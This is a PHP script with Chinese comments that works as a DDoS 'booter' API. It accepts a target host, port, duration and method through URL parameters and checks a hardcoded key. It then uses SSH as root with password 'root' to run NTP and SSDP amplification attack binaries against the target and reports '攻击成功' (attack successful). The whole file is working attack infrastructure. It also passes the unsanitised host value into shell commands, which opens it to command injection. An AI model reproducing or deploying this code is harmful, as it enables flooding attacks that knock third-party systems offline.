<?php
//攻击格式为： http://127.0.0.1/?key=[密钥]&host=[IP地址]&port=[端口]&time=[时间]&method=[模式]
ignore_user_abort(true);
set_time_limit(1000);
$server_ip = "127.0.0.1"; //linux的服务器IP地址
$server_user = "root"; //账号  
$server_pass = "root"; //密码  
$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$action = $_GET['action'];
$array = array("ntp","ssdp");  //支持的模式
$ray = array("api"); //密钥
if (!empty($key)){
}else{
die('Error: 请勿留空!');}
if (in_array($key, $ray)){
}else{
die('Error: 错误的密钥!');}
if (!empty($time)){
}else{
die('Error: 时间不能为空!');}
if (!empty($host)){
}else{
die('Error: 攻击地址不能为空!');}
if (!empty($method)){
}else{
die('Error: 模式不能为空!');}
if (in_array($method, $array)){
}else{
die('Error: 你目前没有这个模式的支持!');}
if ($port > 65535){
die('Error: 端口不可以超过65535');}	
if ($time > 1000){ //限制攻击时间
die('Error: 攻击时间不能大于1000s!');}  
if(ctype_digit($Time)){
die('Error: 时间不是数字!');}
if(ctype_digit($Port)){
die('Error: 端口不是数字!');}
if ($method == "ssdp") { $command = "./ssdp $host $port ssdp.txt $time"; } //攻击脚本、反射文件目录，攻击命令
if ($method == "ntp") { $command = "./ntp $host $port  ntpamp.txt 200 -1 $time"; }
if ($action == "stop") { $command = "pkill $host -f"; }
if (!function_exists("ssh2_connect")) die("Error: 你的服务器没有开启ssh2");
if(!($con = ssh2_connect($server_ip, 22))){
  echo "Error: 连接失败";
} else {
    if(!ssh2_auth_password($con, $server_user, $server_pass)) {
	echo "Error: 登录失败请检查你的信息";
    } else {
	
        if (!($stream = ssh2_exec($con, $command ))) {
            echo "Error: 你的服务器没有能力去执行你的命令，或者你的攻击脚本不存在";
        } else {    
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
			echo "攻击成功!!</br>地址: $host</br>攻击端口: $port </br>攻击的时间: $time</br>使用的模式: $method";
            fclose($stream);
        }
    }
}
?>